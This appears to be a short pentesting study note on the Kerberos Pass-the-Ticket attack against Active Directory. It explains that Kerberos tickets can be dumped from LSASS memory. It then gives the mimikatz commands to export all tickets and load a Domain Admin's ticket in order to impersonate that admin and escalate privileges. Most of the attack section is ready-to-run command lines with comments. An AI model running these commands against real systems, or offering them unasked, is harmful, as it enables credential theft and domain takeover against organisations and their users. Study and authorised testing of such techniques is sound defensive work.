Requirements:
Admin on any AD machine.

##### Overview
Pass the Ticket works by dumping the TGT from the machine's LSASS (Local Security Authority Subsystem Service) memory. This is a system that stores AD credentials. Dumping the TGT with mimikatz will give a .kirbi ticket, which can be used to gain Domain Admin rights if there is a Domain Admin ticket in the LSASS memory. You can use this to impersonate the DA, and get some privilege escalation.


##### Mimikatz exploitation
Gaining tickets:
```
./mimikatz.exe // run mimikatz
privilege::debug // If it does not return "[output '20' OK]", you have not run it as an administrator.
sekurlsa::tickets /export  // Dumps all the .kirbi tickets in LSASS memory to the current directory.
```
Passing obtained tickets:
```
kerberos::ptt TICKET // Load and impersonate the user from TICKET
klist // Get information on loaded ticket
```
Now open a CMD/Powershell shell and you can impersonate the ticket.
